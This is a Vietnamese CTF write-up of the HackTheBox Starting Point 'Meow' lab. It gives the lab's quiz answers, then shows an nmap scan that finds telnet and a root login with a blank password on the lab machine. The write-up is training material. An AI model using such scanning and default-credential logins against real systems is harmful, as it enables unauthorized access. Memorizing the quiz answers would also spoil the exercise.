---
title: HackTheBox | StartingPoint | Meow WriteUp
date: 2023-01-16 
categories: [HackTheBox, StartingPoint]
---


# [StartingPoint] Meow WriteUp

# 1. Trả lời các câu hỏi :

**Câu 01: What does the acronym VM stand for?**

→ Virtual Machine

**Câu 02: What tool do we use to interact with the operating system in order to issue commands via the command line, such as the one to start our VPN connection? It's also known as a console or shell.**

→ terminal

**Câu 03: What service do we use to form our VPN connection into HTB labs?**

→ openvpn

**Câu 04: What is the abbreviated name for a 'tunnel interface' in the output of your VPN boot-up sequence output?**

→ tun

**Câu 05: What tool do we use to test our connection to the target with an ICMP echo request?**

→ ping 

**Câu 06: What is the name of the most common tool for finding open ports on a target?**

→ nmap

**Câu 07: What service do we identify on port 23/tcp during our scans?**

→ telnet

**Câu 08: What username is able to log into the target over telnet with a blank password?**

→ root

 

# 2. Thu thập Flags từ máy ảo :

## 2.1. Tổng quan về máy ảo :

### Kết nối đến máy ảo (meow) :

Kết nối với openvpn của starting point, sử dụng câu lệnh :

```bash
┌──(kali㉿kali)-[~/Desktop/hackthebox]
└─$ sudo openvpn --config /home/kali/Desktop/hackthebox/starting_point_Darko2212.ovpn
```

### Kiểm tra kết nối :

Ip address của máy ảo (meow) : 10.129.181.70

Kiểm tra kết nối → bằng lệnh ping.

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ ping 10.129.181.70    
PING 10.129.181.70 (10.129.181.70) 56(84) bytes of data.
64 bytes from 10.129.181.70: icmp_seq=1 ttl=63 time=207 ms
64 bytes from 10.129.181.70: icmp_seq=2 ttl=63 time=206 ms
64 bytes from 10.129.181.70: icmp_seq=3 ttl=63 time=207 ms
^C
--- 10.129.181.70 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2001ms
rtt min/avg/max/mdev = 206.009/206.781/207.441/0.590 ms
```

### **Các yêu cầu :**

- Thu thập thông tin.
- Khai thác lỗ hổng và leo thang đặc quyền.
- Lấy được nội dung của flags.txt

## 3. Thu thập thông tin :

### sử dụng nmap (tìm các cổng đang mở trên máy ảo) :

→ phát hiện cổng 23 (dịch vụ telnet).

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ nmap -sC -sV -Pn 10.129.181.70
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-17 00:13 EST
Nmap scan report for 10.129.181.70
Host is up (0.20s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
23/tcp open  telnet  Linux telnetd
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 49.66 seconds
```

## 4. Khai thác lỗ hổng :

Thử truy cập dịch vụ telnet bằng câu lệnh :

```bash
telnet 10.129.181.70
```

Chổ này đợi một chút cho nó tải lên, kết nối thành công sẽ hiển thị như bên dưới : 

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ telnet 10.129.181.70
Trying 10.129.181.70...
Connected to 10.129.181.70.
Escape character is '^]'.

  █  █         ▐▌     ▄█▄ █          ▄▄▄▄
  █▄▄█ ▀▀█ █▀▀ ▐▌▄▀    █  █▀█ █▀█    █▌▄█ ▄▀▀▄ ▀▄▀
  █  █ █▄█ █▄▄ ▐█▀▄    █  █ █ █▄▄    █▌▄█ ▀▄▄▀ █▀█

Meow login:
```

Chỗ này có thể dựa vào dữ liệu trong những câu hỏi, như câu hỏi thứ 09 có đề cập đến vấn đề về tài khoản không có mật khẩu, mình có thể thử những mật khẩu mặc định như “admin”, “administrator”, … nhưng theo gợi ý cho câu hỏi thì câu trả lời là “root” nên lấy thử luôn và kết quả là kết nối thành công.

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ telnet 10.129.181.70
Trying 10.129.181.70...
Connected to 10.129.181.70.
Escape character is '^]'.

  █  █         ▐▌     ▄█▄ █          ▄▄▄▄
  █▄▄█ ▀▀█ █▀▀ ▐▌▄▀    █  █▀█ █▀█    █▌▄█ ▄▀▀▄ ▀▄▀
  █  █ █▄█ █▄▄ ▐█▀▄    █  █ █ █▄▄    █▌▄█ ▀▄▄▀ █▀█

Meow login: root
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue 17 Jan 2023 05:26:10 AM UTC

  System load:           0.0
  Usage of /:            41.7% of 7.75GB
  Memory usage:          4%
  Swap usage:            0%
  Processes:             135
  Users logged in:       0
  IPv4 address for eth0: 10.129.181.70
  IPv6 address for eth0: dead:beef::250:56ff:fe96:94d5

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

75 updates can be applied immediately.
31 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Tue Jan 17 05:15:52 UTC 2023 on pts/0
root@Meow:~#
```

## 5. Leo thang đặc quyền :

không cần thiết do sau khi đăng nhập vào máy ảo bằng telnet thì mình đã là root luôn rồi.

## 6. Thu thập flags :

Chỉ cần dùng câu lệnh “ls -alh” 

→ tìm được flags.txt

→ sử dụng “cat flag.txt” để đọc nội dung của flag.

 

```bash
root@Meow:~# ls -alh 
total 36K
drwx------  5 root root 4.0K Jun 18  2021 .
drwxr-xr-x 20 root root 4.0K Jul  7  2021 ..
lrwxrwxrwx  1 root root    9 Jun  4  2021 .bash_history -> /dev/null
-rw-r--r--  1 root root 3.1K Oct  6  2020 .bashrc
drwx------  2 root root 4.0K Apr 21  2021 .cache
-rw-r--r--  1 root root   33 Jun 17  2021 flag.txt
drwxr-xr-x  3 root root 4.0K Apr 21  2021 .local
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
-rw-r--r--  1 root root   75 Mar 26  2021 .selected_editor
drwxr-xr-x  3 root root 4.0K Apr 21  2021 snap
root@Meow:~#
```

## 7. Tài liệu tham khảo :

[https://cheatography.com/davechild/cheat-sheets/linux-command-line/](https://cheatography.com/davechild/cheat-sheets/linux-command-line/)

[https://www.geeksforgeeks.org/nmap-command-in-linux-with-examples/](https://www.geeksforgeeks.org/nmap-command-in-linux-with-examples/)